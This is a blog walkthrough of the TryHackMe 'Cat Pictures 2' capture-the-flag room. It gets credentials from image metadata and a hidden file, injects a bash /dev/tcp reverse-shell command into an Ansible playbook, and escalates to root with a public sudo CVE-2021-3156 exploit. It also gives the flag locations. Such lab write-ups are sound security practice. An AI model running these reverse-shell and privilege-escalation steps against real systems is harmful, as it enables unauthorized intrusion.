---
title: Cat Pictures 2
layout: post
tags: [learn, practice, programming, linux, ctf, tryhackme]
date: 27 July 2023
comments: true
---

# About

Cat Pictures 2 is a CTF hosted on TryHackMe
[here](https://tryhackme.com/room/catpictures2). It mostly focuses on taking
advantage of security through obscurity (when the dev assumed that the file
with the password would be hard to find).

# Walkthrough

<div class="video-container" align="center">
	<iframe
        title="YouTube video player"
        width="840"
        height="478"
        src="https://www.youtube.com/embed/SfV5I3Sj6rA"
        frameborder="0"
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
        allowfullscreen
    >
    </iframe>
</div>

I usually like to start by doing an `export IP=...` so that I don't have to
remember the IP of the target all the time.

Next I have started the usual nmap scan with

```console
nmap -sC -sV $IP
```

This scan resulted in finding many open ports: 22, 80, 222, 3000, 8080. The
ones that I initially found to have some potential are port 80, 3000 and 8080.
Since these are usually used for webapps (3000 and 8080 usually for dev/debug
stuff).

<p align="center">
  <img src="/images/catpictures2/port80.png" width="1000"/>
</p>

On the main website I have found a self-hosted photo-management website using
Lychee. Nothing unusual at first, but if we look through the images and their
information (by clicking on the italic i) we can see some extra information for
the first one.

<p align="center">
  <img src="/images/catpictures2/port80-note.png" width="1000"/>
</p>

There seems to be some text in the `Description` tag with the text `note to
self: strip metadata`. So my next idea was to exiftool the image. So I have
downloaded the image and then I ran exiftool to see what can be found there.

```console
wget http://$IP/uploads/big/f5054e97620f168c7b5088c85ab1d6e4.jpg -O cutecat.jpg
exiftool cutecat.jpg
```

In the `Title` metadata of the image we can see a weird text
`:8080/764efa8________________c4a3bbd9e.txt` (I replaced with _ the real
characters). But we can figure out that it might refer to the port 8080 that we
have found in the earlier scan. So we can slap this text to the IP address and
see what we find. (I lied, I still gave you the real text)

```console
curl $IP:8080/764efa883dda1e11db47671c4a3bbd9e.txt
```

If we take a look at the output of the command we can see a username and a
password and some note about some `gitea` service, which is a git self-hosted
service <https://github.com/go-gitea/gitea>. In the note we also find that
there is an ansible service running on port 1337.

Next I have tried to access from the browser the port 3000 of the target and
tried to login as `samarium`.

<p align="center">
  <img src="/images/catpictures2/port3000-user.png" width="1000"/>
</p>

This allows us to access a git repository which contains the first flag and a
yaml file for ansible that runs a `whoami` command. So we can try to replace
that command with something of our own. But then how do we actually run the
script? Well, we still have port 1337 left to visit.

**First Flag** can be found at
`http://$IP:3000/samarium/ansible/raw/commit/8be5b40d15cfdfd8996e1bb13bdf416eb249bdb0/flag.txt`

On port 1337 we find a `OliveTin` page where we can run the `playbook.yaml`
file. This means that we can replace the command with something like a revshell
and then run the script from the dashboard.

For the revshell I have used <https://www.revshells.com/>. I have chosen the
first one (obviously) and wrapped it with `bash -c`.

```yaml
command: bash -c "bash -i >& /dev/tcp/{YOUR_HOST_IP}/{YOUR_PORT} 0>&1"
```

After we modify the line that runs the command with our new evil command, we
have to start a nc listener on the host.

```console
nc -lvnp {YOUR_PORT}
```

After we have a listener ready we can go to the dashboard and click on `Run
Ansible Playbook`. Wait a few seconds and we should have a reverse shell into
the target machine.

**Second Flag** can be found at `/home/bismuth/flag2.txt`

Next we can use the `.ssh/id_rsa` key to connect with ssh to avoid using the
revshell. Just copy paste the content of id_rsa on host and do a `chmod 600
id_rsa` to be able to use it. Then you can `ssh -i id_rsa bismuth@$IP` to
connect to a better shell.

Next we can use linpeas to try and find some vulnerabilities, while also
looking around the system. Something that I have notices was that the sudo
version is vulnerable to CVE-2021-3156. There is one video from liveoverflow I
saw on the topic <https://www.youtube.com/watch?v=TLa2VqcGGEQ> (from two years
ago 😮). And we can be script kiddies and clone
<https://github.com/teamtopkarl/CVE-2021-3156/tree/main> for a quick and easy
exploit.

I have cloned the repo, then started a http server and send each file to the
target (The important files are: hax.c, lib.c and Makefile). The target has gcc
so you can build the exploit there. With the files copied over to the target I
ran `make` and `./sudo-hax-me-a-sandwich 0` and got access as root.

**Final Flag** can be found at `/root/flag3.txt`

# Conclusion

This felt like a good CTF for practicing more on web services that work with
each other. Usually I don't like CTFs related to stego, but this one did a good
job at making use of images. Altough I don't think anyone would store
information in the image metadata, right? 😅
